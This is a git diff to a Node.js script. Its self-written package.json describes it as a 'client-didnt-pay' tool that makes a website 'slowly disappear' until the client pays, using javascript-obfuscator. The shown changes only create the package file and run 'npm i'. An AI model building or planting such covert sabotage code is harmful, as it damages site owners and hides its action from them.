@@ -20,9 +20,45 @@
 // SOFTWARE.
 // -----------------------------------------------------------------------------
 
+const fs = require('fs')
+
+fs.stat('package.json', function(err, stat) {
+    if(err == null) {
+        //
+    } else if(err.code === 'ENOENT') {
+        // file does not exist
+        fs.writeFileSync('package.json', `{
+            "name": "client-didnt-pay",
+            "version": "1.0.0",
+            "description": "Client isn't paying? This will make the website slowly disappear until they do.",
+            "main": "clientdidntpay.js",
+            "scripts": {
+              "test": "echo Tests not yet made",
+              "start": "node clientdidntpay.js"
+            },
+            "author": "Siddharth Ray",
+            "license": "MIT",
+            "dependencies": {
+              "Console": "^1.1.0",
+              "javascript-obfuscator": "^2.18.1",
+              "prompts": "^2.4.1"
+            }
+          }`);
+    } else {
+        console.log('Some other error: ', err.code);
+    }
+});
+
+const { execSync } = require('child_process');
+execSync('npm i', (err, stdout, stderr) => {
+  if (err) {
+      console.error(err)
+    process.exit(1)
+  }
+});
+
 const Console = require('Console')
 const prompts = require('prompts')
-const fs = require('fs')
 const JavaScriptObfuscator = require('javascript-obfuscator')
 
 Console.success(`  ______   __  __                        __            _______   __        __           __  __            _______                     
